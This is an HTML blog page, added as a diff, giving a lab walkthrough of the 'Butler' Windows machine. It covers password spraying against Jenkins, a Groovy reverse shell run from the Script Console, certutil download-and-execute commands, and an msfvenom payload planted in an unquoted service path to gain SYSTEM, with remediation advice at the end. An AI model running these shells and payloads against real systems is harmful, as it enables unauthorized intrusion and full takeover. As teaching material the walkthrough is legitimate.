@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Butler Machine Walkthrough - Jenkins Exploitation and Windows Privilege Escalation">
+    <title>Butler Machine Walkthrough | Muhammad Mughees</title>
+    <link rel="stylesheet" href="../../styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .walkthrough-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        .walkthrough-header {
+            text-align: center;
+            margin-bottom: 3rem;
+            padding: 2rem;
+            background: linear-gradient(135deg, var(--secondary-color) 0%, #112240 100%);
+            border-radius: 10px;
+        }
+
+        .walkthrough-header h1 {
+            font-size: 2.5rem;
+            color: var(--primary-color);
+            margin-bottom: 1rem;
+        }
+
+        .walkthrough-section {
+            margin-bottom: 3rem;
+            background: rgba(255, 255, 255, 0.03);
+            padding: 2rem;
+            border-radius: 10px;
+            border-left: 4px solid var(--primary-color);
+        }
+
+        .walkthrough-section h2 {
+            color: var(--primary-color);
+            margin-bottom: 1.5rem;
+            font-size: 2rem;
+        }
+
+        .walkthrough-section h3 {
+            color: var(--accent-color);
+            margin-top: 2rem;
+            margin-bottom: 1rem;
+            font-size: 1.5rem;
+        }
+
+        .walkthrough-section p {
+            line-height: 1.8;
+            margin-bottom: 1rem;
+            color: #8892b0;
+        }
+
+        .walkthrough-section code {
+            background: rgba(100, 255, 218, 0.1);
+            padding: 0.2rem 0.5rem;
+            border-radius: 4px;
+            color: var(--accent-color);
+            font-family: 'Courier New', monospace;
+        }
+
+        .code-block-wrapper {
+            position: relative;
+            margin: 1.5rem 0;
+        }
+
+        .walkthrough-section pre {
+            background: #112240;
+            padding: 1.5rem;
+            padding-top: 2.5rem;
+            border-radius: 8px;
+            overflow-x: auto;
+            margin: 0;
+            border: 1px solid var(--primary-color);
+        }
+
+        .walkthrough-section pre code {
+            background: none;
+            padding: 0;
+            color: var(--primary-color);
+        }
+
+        .copy-btn {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background: var(--primary-color);
+            color: var(--secondary-color);
+            border: none;
+            padding: 0.4rem 0.8rem;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.85rem;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            z-index: 10;
+        }
+
+        .copy-btn:hover {
+            background: var(--accent-color);
+            transform: translateY(-2px);
+        }
+
+        .copy-btn:active {
+            transform: translateY(0);
+        }
+
+        .copy-btn.copied {
+            background: #4CAF50;
+        }
+
+        .walkthrough-image {
+            text-align: center;
+            margin: 2rem 0;
+        }
+
+        .walkthrough-image img {
+            max-width: 100%;
+            border-radius: 10px;
+            border: 2px solid var(--primary-color);
+            box-shadow: 0 10px 30px rgba(0, 255, 136, 0.2);
+        }
+
+        .back-to-blog {
+            display: inline-block;
+            padding: 1rem 2rem;
+            background: var(--primary-color);
+            color: var(--secondary-color);
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            margin-bottom: 2rem;
+        }
+
+        .back-to-blog:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 255, 136, 0.3);
+        }
+
+        .info-box {
+            background: rgba(100, 255, 218, 0.1);
+            padding: 1.5rem;
+            border-radius: 8px;
+            border-left: 4px solid var(--accent-color);
+            margin: 1.5rem 0;
+        }
+
+        .warning-box {
+            background: rgba(255, 136, 0, 0.1);
+            padding: 1.5rem;
+            border-radius: 8px;
+            border-left: 4px solid #ff8800;
+            margin: 1.5rem 0;
+        }
+
+        ul {
+            list-style: none;
+            padding-left: 0;
+        }
+
+        ul li {
+            padding-left: 1.5rem;
+            margin-bottom: 0.5rem;
+            color: #8892b0;
+            position: relative;
+        }
+
+        ul li:before {
+            content: "▹";
+            position: absolute;
+            left: 0;
+            color: var(--primary-color);
+        }
+
+        @media (max-width: 768px) {
+            .walkthrough-container {
+                padding: 1rem;
+            }
+
+            .walkthrough-header h1 {
+                font-size: 2rem;
+            }
+
+            .walkthrough-section {
+                padding: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <button id="backToTop" class="back-to-top">
+        <i class="fas fa-arrow-up"></i>
+    </button>
+
+    <div class="walkthrough-container">
+        <a href="../../blog.html" class="back-to-blog">
+            <i class="fas fa-arrow-left"></i> Back to Blog
+        </a>
+
+        <div class="walkthrough-header">
+            <h1>Butler Machine Walkthrough</h1>
+            <p style="color: var(--accent-color); font-size: 1.2rem;">Jenkins Exploitation & Windows Unquoted Service Path Privilege Escalation</p>
+        </div>
+
+        <!-- Overview -->
+        <div class="walkthrough-section">
+            <h2><i class="fas fa-info-circle"></i> Overview</h2>
+            <p>This walkthrough demonstrates a complete penetration test of the Butler Windows machine. We'll exploit a Jenkins server with weak credentials, gain initial access via Groovy script console, and escalate privileges through an unquoted service path vulnerability.</p>
+            
+            <div class="info-box">
+                <strong>Target Machine:</strong> Butler<br>
+                <strong>Platform:</strong> Windows<br>
+                <strong>Difficulty:</strong> Easy to Medium<br>
+                <strong>Skills Required:</strong> Nmap, Jenkins Exploitation, Groovy Reverse Shell, Windows Privilege Escalation, Unquoted Service Paths
+            </div>
+
+            <p><strong>VM Download:</strong> <a href="https://drive.google.com/drive/folders/1xJy4ozXaahXvjbgTeJVWyY-eUGIKgCj1" target="_blank" style="color: var(--primary-color);">VMs - Google Drive</a></p>
+        </div>
+
+        <!-- Reconnaissance -->
+        <div class="walkthrough-section">
+            <h2><i class="fas fa-search"></i> Reconnaissance</h2>
+            
+            <h3>Nmap Scan</h3>
+            <p>After logging in and obtaining the target IP, let's start with an Nmap scan:</p>
+            <pre><code>nmap -sV -sC 10.0.2.X</code></pre>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-37d53f00-528f-417a-9eaf-1ec5e095f905-Part-1/image.png" alt="Nmap Scan Results">
+            </div>
+
+            <h3>Discovered Services</h3>
+            <p>The scan reveals port 8080 is open, typically indicating a web service or application server.</p>
+        </div>
+
+        <!-- Web Enumeration -->
+        <div class="walkthrough-section">
+            <h2><i class="fas fa-globe"></i> Web Service Enumeration</h2>
+            
+            <h3>Jenkins Discovery</h3>
+            <p>Navigating to http://10.0.2.X:8080 reveals a Jenkins login page.</p>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-37d53f00-528f-417a-9eaf-1ec5e095f905-Part-1/image 1.png" alt="Jenkins Login Page">
+            </div>
+
+            <p>Jenkins is a popular open-source automation server used for continuous integration and deployment. Let's enumerate:</p>
+            <ul>
+                <li>Directory enumeration - No interesting findings</li>
+                <li>Page source analysis - Version information not immediately disclosed</li>
+                <li>Known exploits - Need credentials first</li>
+            </ul>
+
+            <h3>Password Spraying Attack</h3>
+            <p>Since direct enumeration didn't yield results, let's attempt a password spraying attack using Burp Suite.</p>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-37d53f00-528f-417a-9eaf-1ec5e095f905-Part-1/image 2.png" alt="Burp Suite Intercept">
+            </div>
+
+            <p>Steps to perform password spraying:</p>
+            <ul>
+                <li>Intercept the login request in Burp Suite</li>
+                <li>Send to Intruder</li>
+                <li>Set attack type to <strong>Cluster Bomb</strong></li>
+                <li>Mark both username and password fields as payload positions</li>
+            </ul>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-37d53f00-528f-417a-9eaf-1ec5e095f905-Part-1/image 3.png" alt="Burp Suite Attack Configuration">
+            </div>
+
+            <h3>Credentials Found</h3>
+            <p>After testing common Jenkins usernames and passwords, we discovered valid credentials:</p>
+            
+            <div class="info-box">
+                <strong>Username:</strong> jenkins<br>
+                <strong>Password:</strong> jenkins
+            </div>
+
+            <p>This is a common default or weak credential combination often left unchanged on Jenkins installations.</p>
+        </div>
+
+        <!-- Initial Access -->
+        <div class="walkthrough-section">
+            <h2><i class="fas fa-key"></i> Initial Access</h2>
+            
+            <h3>Jenkins Dashboard Access</h3>
+            <p>Using the discovered credentials, we successfully log into Jenkins:</p>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-37d53f00-528f-417a-9eaf-1ec5e095f905-Part-1/image 4.png" alt="Jenkins Login Success">
+            </div>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-37d53f00-528f-417a-9eaf-1ec5e095f905-Part-1/image 5.png" alt="Jenkins Dashboard">
+            </div>
+
+            <h3>Script Console Discovery</h3>
+            <p>After exploring the Jenkins dashboard, we discover the <strong>Script Console</strong> under "Manage Jenkins".</p>
+
+            <p>The Script Console allows administrators to run arbitrary Groovy scripts on the Jenkins server. This is a powerful feature that can be abused to gain command execution.</p>
+
+            <h3>Groovy Reverse Shell</h3>
+            <p>We can execute a Groovy reverse shell to gain access to the underlying Windows system. Search for "groovy reverse shell" on Google to find a GitHub repository with the script.</p>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-37d53f00-528f-417a-9eaf-1ec5e095f905-Part-1/image 6.png" alt="Groovy Reverse Shell Script">
+            </div>
+
+            <p>Here's the Groovy reverse shell script:</p>
+            <pre><code>String host="10.0.2.15";  // Change to your attacker IP
+int port=8044;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+Socket s=new Socket(host,port);
+InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
+OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+while(!s.isClosed()){
+    while(pi.available()>0)so.write(pi.read());
+    while(pe.available()>0)so.write(pe.read());
+    while(si.available()>0)po.write(si.read());
+    so.flush();
+    po.flush();
+    Thread.sleep(50);
+    try {p.exitValue();break;}catch (Exception e){}
+};
+p.destroy();
+s.close();</code></pre>
+
+            <p>Modify the script:</p>
+            <ul>
+                <li>Change <code>host</code> to your attacker machine IP (e.g., 10.0.2.15)</li>
+                <li>Choose a port number (e.g., 8044)</li>
+            </ul>
+
+            <h3>Setting Up Listener</h3>
+            <p>Before running the script, set up a netcat listener on your attack machine:</p>
+            <pre><code>nc -nvlp 8044</code></pre>
+
+            <h3>Executing the Reverse Shell</h3>
+            <p>Paste the modified Groovy script into the Script Console and click "Run".</p>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-37d53f00-528f-417a-9eaf-1ec5e095f905-Part-1/image 7.png" alt="Shell Received">
+            </div>
+
+            <p>Success! We've received a shell connection.</p>
+
+            <h3>Initial Enumeration</h3>
+            <pre><code>whoami
+# Output: butler\butler
+
+systeminfo</code></pre>
+
+            <p>We're currently running as the <code>butler</code> user, not SYSTEM. We need to escalate our privileges.</p>
+        </div>
+
+        <!-- Privilege Escalation -->
+        <div class="walkthrough-section">
+            <h2><i class="fas fa-arrow-up"></i> Privilege Escalation</h2>
+            
+            <h3>Using WinPEAS for Enumeration</h3>
+            <p>WinPEAS is an excellent tool for Windows privilege escalation enumeration. Download it from:</p>
+            <p><a href="https://github.com/peass-ng/PEASS-ng/releases" target="_blank" style="color: var(--primary-color);">PEASS-ng Releases</a></p>
+
+            <h3>Transferring WinPEAS</h3>
+            <p>Set up a Python HTTP server on your attack machine:</p>
+            <pre><code>python3 -m http.server 80</code></pre>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-37d53f00-528f-417a-9eaf-1ec5e095f905-Part-1/image 8.png" alt="HTTP Server Running">
+            </div>
+
+            <p>On the target machine, download WinPEAS using certutil:</p>
+            <pre><code>certutil.exe -urlcache -f http://10.0.2.15/winPEASx64.exe winPEASx64.exe</code></pre>
+
+            <p>Execute WinPEAS:</p>
+            <pre><code>.\winPEASx64.exe</code></pre>
+
+            <h3>Vulnerability Discovery: Unquoted Service Path</h3>
+            <p>WinPEAS reveals an interesting finding - an unquoted service path with spaces:</p>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-37d53f00-528f-417a-9eaf-1ec5e095f905-Part-1/image 9.png" alt="WinPEAS Unquoted Service Path">
+            </div>
+
+            <div class="info-box">
+                <strong>Service Name:</strong> WiseBootAssistant<br>
+                <strong>Path:</strong> C:\Program Files (x86)\Wise\Wise Care 365\BootTime.exe<br>
+                <strong>Vulnerability:</strong> Unquoted Service Path with Spaces
+            </div>
+
+            <h3>Understanding Unquoted Service Paths</h3>
+            <p>When Windows encounters an unquoted path with spaces, it interprets it in multiple ways:</p>
+            <ul>
+                <li><code>C:\Program.exe</code></li>
+                <li><code>C:\Program Files (x86)\Wise\Wise.exe</code></li>
+                <li><code>C:\Program Files (x86)\Wise\Wise Care 365\BootTime.exe</code></li>
+            </ul>
+
+            <p>If we can place a malicious executable at <code>C:\Program Files (x86)\Wise\Wise.exe</code>, Windows will execute it when the service starts!</p>
+
+            <h3>Creating Malicious Payload</h3>
+            <p>Generate a reverse shell payload using msfvenom:</p>
+            <pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.15 LPORT=7777 -f exe > Wise.exe</code></pre>
+
+            <p>Transfer the payload to the target:</p>
+            <pre><code>certutil.exe -urlcache -f http://10.0.2.15/Wise.exe Wise.exe</code></pre>
+
+            <h3>Navigating to Target Directory</h3>
+            <p>Navigate to the vulnerable directory:</p>
+            <pre><code>cd "C:\Program Files (x86)\Wise"
+dir</code></pre>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-37d53f00-528f-417a-9eaf-1ec5e095f905-Part-1/image 10.png" alt="Wise Directory">
+            </div>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-37d53f00-528f-417a-9eaf-1ec5e095f905-Part-1/image 11.png" alt="Wise.exe Uploaded">
+            </div>
+
+            <h3>Exploiting the Service</h3>
+            <p>Set up a netcat listener for the privileged shell:</p>
+            <pre><code>nc -nvlp 7777</code></pre>
+
+            <p>Now we need to restart the service to trigger our payload. Use these commands:</p>
+            <pre><code># Stop the service
+sc stop WiseBootAssistant
+
+# Verify it's stopped
+sc query WiseBootAssistant
+
+# Start the service (this will execute our Wise.exe)
+sc start WiseBootAssistant</code></pre>
+
+            <div class="warning-box">
+                <strong>Important:</strong> Simply running Wise.exe manually will execute it as the current user (butler). We need the service to start it, which will run it with SYSTEM privileges.
+            </div>
+        </div>
+
+        <!-- Root Access -->
+        <div class="walkthrough-section">
+            <h2><i class="fas fa-flag-checkered"></i> SYSTEM Access</h2>
+            
+            <div class="walkthrough-image">
+                <img src="ExportBlock-37d53f00-528f-417a-9eaf-1ec5e095f905-Part-1/image 12.png" alt="SYSTEM Shell">
+            </div>
+
+            <p>Success! We received a connection with SYSTEM privileges!</p>
+
+            <pre><code>whoami
+# Output: nt authority\system</code></pre>
+
+            <div class="info-box">
+                <strong>Box Rooted Successfully! 🎉</strong><br>
+                We have achieved SYSTEM-level access on the Butler machine.
+            </div>
+        </div>
+
+        <!-- Summary -->
+        <div class="walkthrough-section">
+            <h2><i class="fas fa-list-check"></i> Summary</h2>
+            
+            <h3>Attack Chain</h3>
+            <ul>
+                <li>Nmap scan discovered Jenkins on port 8080</li>
+                <li>Performed password spraying attack using Burp Suite</li>
+                <li>Discovered weak credentials: jenkins/jenkins</li>
+                <li>Logged into Jenkins dashboard</li>
+                <li>Found Script Console in Manage Jenkins</li>
+                <li>Executed Groovy reverse shell for initial access</li>
+                <li>Gained shell as butler user</li>
+                <li>Used WinPEAS for privilege escalation enumeration</li>
+                <li>Discovered unquoted service path vulnerability in WiseBootAssistant</li>
+                <li>Created malicious Wise.exe using msfvenom</li>
+                <li>Placed payload in exploitable directory</li>
+                <li>Restarted service to trigger payload execution</li>
+                <li>Gained SYSTEM shell</li>
+            </ul>
+
+            <h3>Key Lessons</h3>
+            <ul>
+                <li>Default and weak credentials remain a critical vulnerability</li>
+                <li>Jenkins Script Console provides powerful code execution capabilities</li>
+                <li>Always enumerate services with administrative tools like WinPEAS</li>
+                <li>Unquoted service paths with spaces are exploitable on Windows</li>
+                <li>Service restarts can trigger malicious payloads with elevated privileges</li>
+                <li>Password spraying can be effective against web applications</li>
+                <li>Windows privilege escalation often involves service misconfigurations</li>
+            </ul>
+
+            <h3>Tools Used</h3>
+            <ul>
+                <li><strong>Nmap</strong> - Port scanning and service detection</li>
+                <li><strong>Burp Suite</strong> - Password spraying attack</li>
+                <li><strong>Netcat</strong> - Reverse shell listener</li>
+                <li><strong>WinPEAS</strong> - Windows privilege escalation enumeration</li>
+                <li><strong>Msfvenom</strong> - Payload generation</li>
+                <li><strong>Certutil</strong> - File transfer on Windows</li>
+                <li><strong>Python HTTP Server</strong> - Hosting files for download</li>
+            </ul>
+
+            <h3>Remediation</h3>
+            <ul>
+                <li>Never use default credentials (jenkins/jenkins)</li>
+                <li>Implement strong password policies</li>
+                <li>Restrict access to Jenkins Script Console</li>
+                <li>Enable authentication and authorization for sensitive features</li>
+                <li>Quote all service paths, especially those with spaces</li>
+                <li>Implement principle of least privilege for service accounts</li>
+                <li>Regular security audits of service configurations</li>
+                <li>Keep Jenkins and all software up to date</li>
+            </ul>
+
+            <div class="warning-box">
+                <strong>Disclaimer:</strong> This walkthrough is for educational purposes only. Always obtain proper authorization before performing penetration testing on any system.
+            </div>
+        </div>
+
+        <a href="../../blog.html" class="back-to-blog">
+            <i class="fas fa-arrow-left"></i> Back to Blog
+        </a>
+    </div>
+
+    <script src="../../script.js"></script>
+    <script>
+        // Wrap all pre elements with copy button
+        document.addEventListener('DOMContentLoaded', function() {
+            const preElements = document.querySelectorAll('.walkthrough-section pre');
+            
+            preElements.forEach(pre => {
+                // Create wrapper
+                const wrapper = document.createElement('div');
+                wrapper.className = 'code-block-wrapper';
+                
+                // Create copy button
+                const copyBtn = document.createElement('button');
+                copyBtn.className = 'copy-btn';
+                copyBtn.innerHTML = '<i class="fas fa-copy"></i> Copy';
+                
+                // Insert wrapper before pre
+                pre.parentNode.insertBefore(wrapper, pre);
+                
+                // Move pre into wrapper and add button
+                wrapper.appendChild(copyBtn);
+                wrapper.appendChild(pre);
+                
+                // Copy functionality
+                copyBtn.addEventListener('click', function() {
+                    const code = pre.querySelector('code').textContent;
+                    navigator.clipboard.writeText(code).then(() => {
+                        copyBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
+                        copyBtn.classList.add('copied');
+                        
+                        setTimeout(() => {
+                            copyBtn.innerHTML = '<i class="fas fa-copy"></i> Copy';
+                            copyBtn.classList.remove('copied');
+                        }, 2000);
+                    });
+                });
+            });
+        });
+    </script>
+</body>
+</html>
